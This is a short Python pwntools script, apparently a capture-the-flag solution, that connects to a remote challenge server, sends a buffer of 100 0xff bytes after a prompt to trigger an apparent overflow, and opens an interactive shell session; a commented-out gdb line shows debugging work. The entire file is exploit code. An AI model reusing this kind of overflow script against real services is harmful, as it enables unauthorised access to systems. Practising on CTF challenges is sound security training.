from pwn import *

p = remote("mc.ax",31199)
#id = gdb.attach(p,gdbscript="b * main +175")
a= '\xff'
p.sendlineafter(":(\n",a*100)
p.interactive()